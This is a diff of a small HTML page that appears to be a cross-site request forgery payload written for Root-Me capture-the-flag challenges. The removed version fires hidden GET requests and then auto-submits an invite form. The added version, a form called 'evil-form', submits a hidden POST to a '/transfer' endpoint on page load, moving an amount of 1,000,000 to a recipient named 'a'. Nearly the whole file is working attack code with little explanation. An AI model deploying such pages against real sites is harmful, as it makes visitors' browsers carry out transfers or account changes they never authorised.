@@ -1,27 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="referrer" content="no-referrer">
-    <title>Chargement...</title>
-</head>
 <body>
-    <h1>Chargement du projet en cours...</h1>
 
-    <img src="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club?username=a" style="display:none">
-    <img src="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club?invite=a" style="display:none">
-    <img src="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club?action=invite&username=a" style="display:none">
-
-    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" id="final-form">
-        <input type="hidden" name="username" value="a">
-        <input type="hidden" name="submit" value="Invite">
+    <form action="https://instance-019aa377-a1db-70ca-acdf-88b0495225ca.challenges.root-me.pro/transfer" method="POST" id="evil-form">
+        
+        <input type="hidden" name="recipient" value="a">
+        
+        <input type="hidden" name="amount" value="1000000">
+        
     </form>
 
     <script>
-        // On laisse 1 seconde aux images (GET) pour se charger
-        setTimeout(function() {
-            document.getElementById('final-form').submit();
-        }, 1000);
+        // Dès que la page charge, on valide le formulaire automatiquement
+        document.getElementById('evil-form').submit();
     </script>
 
 </body>
